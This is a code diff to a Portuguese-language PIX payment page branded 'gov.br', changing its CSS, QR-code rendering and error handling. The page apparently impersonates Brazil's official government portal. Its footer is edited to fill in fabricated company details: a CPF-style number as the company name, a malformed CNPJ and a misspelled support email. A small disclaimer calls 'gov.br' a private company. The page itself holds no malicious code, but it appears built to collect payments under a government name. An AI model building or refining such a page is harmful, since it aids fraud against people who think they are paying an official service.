@@ -111,7 +111,7 @@
   .resumo div+div{border-top:1px solid var(--line)}
   .resumo .tot{background:#eef3fb;font-weight:700;font-size:1.05rem}
   #qr{display:grid;place-items:center;margin:0 0 14px}
-  #qr canvas,#qr img{background:#fff;padding:8px;border-radius:8px}
+  #qr canvas,#qr img,#qr svg{background:#fff;padding:8px;border-radius:8px;width:236px;height:236px}
   textarea{width:100%;height:84px;resize:none;border:1px solid var(--line);border-radius:8px;padding:10px;background:var(--bg);color:var(--ink);font:12px/1.4 ui-monospace,Menlo,monospace}
   .msg{margin-top:14px;font-size:.9rem;color:var(--mute);text-align:center}
   .erro{color:var(--err)}
@@ -119,14 +119,14 @@
   @keyframes p{50%{opacity:.25}}
   .okicon{width:56px;height:56px;border-radius:50%;background:var(--soft);display:grid;place-items:center;margin:0 auto 14px}
   .okicon::after{content:"";width:20px;height:11px;border-left:4px solid var(--brand);border-bottom:4px solid var(--brand);transform:rotate(-45deg) translate(2px,-2px)}
-  .busca{width:100%;max-width:420px;padding:12px 16px;border:1px solid #d9d9d9;border-radius:999px;font:inherit;margin-bottom:18px}
-.tabela{overflow-x:auto;background:#fff;border:1px solid #d9d9d9;border-radius:12px}
-table{width:100%;border-collapse:collapse}
-th,td{text-align:left;padding:14px 18px;border-bottom:1px solid #d9d9d9}
-th{background:#eef3fb;color:#071d41;font-size:.95rem}
-td.v{white-space:nowrap;font-weight:600}
-tr:last-child td{border-bottom:0}
-.vazio{padding:20px;color:#575757}
+  .busca{width:100%;max-width:420px;padding:12px 16px;border:1px solid var(--line);border-radius:999px;font:inherit;background:var(--card);color:var(--ink);margin-bottom:18px}
+  .tabela{overflow-x:auto;background:var(--card);border:1px solid var(--line);border-radius:12px}
+  table{width:100%;border-collapse:collapse}
+  th,td{text-align:left;padding:14px 18px;border-bottom:1px solid var(--line)}
+  th{font-family:"Raleway",sans-serif;color:var(--title);background:#eef3fb;font-size:.95rem}
+  td.v{white-space:nowrap;font-weight:600}
+  tr:last-child td{border-bottom:0}
+  .vazio{padding:20px;color:var(--mute)}
   [hidden]{display:none!important}
 </style>
 </head>
@@ -272,7 +272,7 @@ tr:last-child td{border-bottom:0}
 
 <footer>
   <div class="wrap">
-    <p><strong>gov.br</strong><br>Razão social: [PREENCHER] &middot; CNPJ: [PREENCHER]<br>Suporte: [PREENCHER E-MAIL OU WHATSAPP]</p>
+    <p><strong>gov.br</strong><br>Razão social: 121.484.448.15 &middot; CNPJ: 111.515.147.899.646.45 <br>Suporte: gov.emial@mail.com</p>
     <p>A gov.br é uma empresa privada e não possui vínculo com órgãos ou serviços do governo. Pagamentos processados via PIX por provedor de pagamentos parceiro.</p>
   </div>
 </footer>
@@ -309,7 +309,7 @@ tr:last-child td{border-bottom:0}
   </div>
 </dialog>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script src="/qrcode.js"></script>
 <script>
 const $ = (id) => document.getElementById(id);
 const CHAVE = "pix_tx_id";
@@ -321,10 +321,17 @@ let timer = null;
 function passo(n){ for (const i of [1,2,3]) $("p"+i).hidden = i !== n; }
 
 function desenharQR(texto){
-  $("qr").innerHTML = "";
-  try { new QRCode($("qr"), { text: texto, width: 200, height: 200, correctLevel: QRCode.CorrectLevel.L }); } catch {}
+  const el = $("qr"); el.innerHTML = "";
+  try {
+    const qr = qrcode(0, "M");      // 0 = tamanho automático (aceita códigos PIX longos)
+    qr.addData(texto, "Byte");
+    qr.make();
+    el.innerHTML = qr.createSvgTag({ cellSize: 4, margin: 0, scalable: true });
+  } catch (e) {
+    console.error("Falha ao desenhar QR:", e);
+    el.textContent = "Não foi possível exibir o QR Code. Use o código abaixo (copia e cola).";
+  }
 }
-
 
 async function checar(id){
   try {
@@ -392,14 +399,14 @@ $("gerar").onclick = async () => {
   try {
     const r = await fetch("/api/create", { method: "POST" });
     const d = await r.json();
-    if (!r.ok) throw new Error(d.error || "erro");
+    if (!r.ok) { console.error("Erro ao gerar PIX:", r.status, d); throw new Error("http " + r.status); }
     localStorage.setItem(CHAVE, JSON.stringify({ id: d.id, code: d.copy_paste }));
     $("codigo").value = d.copy_paste;
     desenharQR(d.copy_paste);
     passo(2);
     acompanhar(d.id);
   } catch (e) {
-    $("erro").textContent = "Não foi possível gerar o PIX agora. Tente novamente em instantes.";
+    $("erro").textContent = "Não foi possível gerar o PIX agora. Tente novamente em instantes." + (e && e.message ? " (" + e.message + ")" : "");
     $("erro").hidden = false;
   } finally { $("gerar").disabled = false; }
 };
